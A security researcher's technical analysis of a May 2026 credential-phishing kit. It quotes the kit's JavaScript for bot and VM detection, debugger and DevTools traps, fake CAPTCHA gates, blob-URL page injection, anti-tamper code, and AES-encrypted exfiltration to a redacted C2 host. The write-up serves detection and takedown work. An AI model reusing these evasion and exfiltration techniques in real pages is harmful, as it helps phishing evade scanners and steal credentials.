# Technical Analysis: BEC Campaign, May 2026

All findings are from static source analysis. No live URLs were executed.

---

## Initial Recon

Passive scanning flagged the worker URL before any source was pulled. Findings at that stage:

- TLS certificate age was 0 days at discovery. The cert was issued May 11, 2026.
- The page loaded external resources from `logincdn.msftauth.net`, a legitimate Microsoft CDN. This is a common technique to create authentic-looking network traffic.
- CryptoJS 4.1.1 was present on what presented as a login-style page.
- Automated scanner returned a clean verdict. The evasion methods described below explain why.
- Each victim link contained a per-victim `ei=` parameter. The value is a base64-encoded email address used by the kit to pre-fill and identify the target.

---

## Bot Detection and Evasion

The kit runs a scoring system before rendering any credential content. A bot score above a threshold redirects the visitor or renders a decoy page instead of the phishing content. The checks run silently in the background.

### Webdriver and Automation Globals

```javascript
var _p1 = ['webdriver','__nightmare','callPhantom','$cdc_','$wdc_'...];
for(var i=0;i<_p1.length;i++){
    try{if(_w[_p1[i]]||_d[_p1[i]])_s+=3;}catch(e){}
}
```

Checks for known automation globals on `window` and `document`. Each hit adds to the bot score.

### Stack Trace Inspection

```javascript
try { throw new Error(); } catch(e) {
    var stackPatterns = ['puppeteer','selenium','webdriver','playwright'...];
    for(var i=0;i<stackPatterns.length;i++){
        if(e.stack.toLowerCase().indexOf(stackPatterns[i])>-1) _s+=10;
    }
}
```

Throws a deliberate error and inspects the stack trace for automation framework names. A match adds 10 points to the bot score.

### VM Detection via WebGL Renderer

```javascript
if(/SwiftShader|LLVMpipe|VirtualBox|VMware/i.test(renderer)) _s+=3;
```

Pulls the WebGL renderer string and checks for software renderers and known VM environments.

### Continuous Debugger Loop

```javascript
(function _dt(){
    try{(function(){return false;})['constructor']('debugger')();}
    catch(e){}
    setTimeout(_dt,50);
})();
```

Runs a debugger trap every 50ms. In a live browser with DevTools open, execution halts. In a headless environment, the trap fires silently and the timing deviation is detectable.

### DevTools Dimension Detection

```javascript
setInterval(function(){
    var wDiff=(w.outerWidth-w.innerWidth)-_baseW>_threshold;
    var hDiff=(w.outerHeight-w.innerHeight)-_baseH>_threshold;
    if(wDiff||hDiff){w.location.replace('about:blank');}
},1000);
```

Polls window dimensions every second. If the difference between outer and inner dimensions exceeds the baseline by a threshold, it assumes DevTools are open and redirects to `about:blank`.

### DOM Hash Evasion

The page produces a different SHA-256 hash on every render at the same URL and byte size:

```
Scan 1 (17:13 UTC):  5c9a3319ca473b283ea6fba4e6b999098c6ea782...
Scan 2 (18:21 UTC):  dd9888e12663dd93590cc7d5e1ff3a60d94bd42d...
Same URL. Same byte size. Different hash every render.
```

Content-based scanners that cache or compare hashes will never match a prior sample. This was confirmed with back-to-back scans one hour apart.

---

## Phishing Chain

### Gate Variant 1: Microsoft Press-and-Hold

The first worker presented a CAPTCHA-style gate using an image pulled from Microsoft's legitimate CDN:

```javascript
scanImg.src = 'https://logincdn.msftauth.net/shared/5/images/
    solve_captcha_white_be191d6e17d0b842754c.png';
```

Using a real Microsoft asset means the external request is indistinguishable from legitimate Microsoft authentication traffic.

### Gate Variant 2: Fake reCAPTCHA

After the first worker was taken down, the second deployment swapped the gate for a reCAPTCHA clone:

```javascript
function capChkClick(){
    box.classList.add('loading');
    setTimeout(function(){
        box.classList.remove('loading');
        box.classList.add('checked');
        setTimeout(function(){
            if(window._captchaPass) window._captchaPass();
        }, 500);
    }, 1200);
}
```

No actual CAPTCHA validation occurs. The checkbox animation plays out and the credential page loads. The visual is a clone of Google's reCAPTCHA v2 checkbox.

### Blob URL Payload Delivery

Once the gate passes, the credential page is injected via a blob URL:

```javascript
var blob = new Blob([htmlContent], {type:'text/html;charset=utf-8'});
return URL.createObjectURL(blob);
```

The phishing domain never appears in the address bar. The URL the browser shows is a `blob:` URI local to the page. URL blocklists have nothing to match against.

### MutationObserver Anti-Tamper

A MutationObserver watches the document body and removes any injected nodes it did not create:

```javascript
var obs = new MutationObserver(function(muts){
    for(var i=0;i<muts.length;i++){
        for(var j=0;j<muts[i].addedNodes.length;j++){
            var n = muts[i].addedNodes[j];
            if(n.hasAttribute && n.hasAttribute('data-captcha-root')) continue;
            if(_isInvisible(n)) continue;
            try{ n.remove(); }catch(e){}
        }
    }
});
obs.observe(document.body, {childList: true});
```

Any node injected by browser extensions or analysis tools is immediately removed. Nodes created by the kit itself are marked with `data-captcha-root` and skipped.

---

## C2 Communication

Credentials are encrypted before exfiltration using AES-CBC. The passphrase is hardcoded in the client-side source:

```javascript
var _API_KEY = '[REDACTED-AES-KEY]';
var _WEBHOOK_BASE = 'https://[REDACTED-C2-HOST]';

async function _getAesKey(ks) {
    var kd = new TextEncoder().encode(ks);
    var hsh = await crypto.subtle.digest('SHA-256', kd);
    return await crypto.subtle.importKey(
        'raw', hsh, {name:'AES-CBC'}, false, ['encrypt','decrypt']
    );
}
```

The key derivation is SHA-256 of the passphrase. The IV is the first 16 bytes of each payload. Encoding is URL-safe base64.

Beacon payload structure:

```json
{
  "hash": "<ei parameter value>",
  "ttl": 60,
  "e": "<victim email decoded from URL>",
  "h": "<campaign host id>",
  "c": "<campaign code>",
  "r": "<redirect flag>",
  "domain": "<worker hostname>"
}
```

The passphrase is hardcoded in publicly accessible client-side source. The encryption provides no protection against anyone who reads the page.

---

## Technology Fingerprint Deception

The kit injects fake framework markers into the DOM:

```javascript
'<!-- react-root -->',
'<!-- vite-ignore -->',
'data-reactroot',
'data-sveltekit',
'src/index.jsx'
```

Technology identification tools that fingerprint based on DOM markers or HTML comments will report React, Vite, or Svelte. The actual stack is vanilla JavaScript and plain HTML with no framework dependencies.

---

## Redeployment Pattern

| Date   | Event |
|--------|-------|
| May 11 | Worker deployed, TLS cert issued, age 0 days at discovery |
| May 12 | Discovered, reported to hosting provider |
| May 12 | First worker taken down after manual review |
| May 12 | Second worker live, gate variant updated to reCAPTCHA clone |
| May 13 | DOM hash evasion confirmed via back-to-back scans |
| May 13 | Supplemental reports filed with evasion proof |
| May 13 | Both workers and C2 taken down |

Three workers and one C2 deployed across two days. Each redeployment included targeted changes that addressed the specific signals flagged in the previous takedown report.
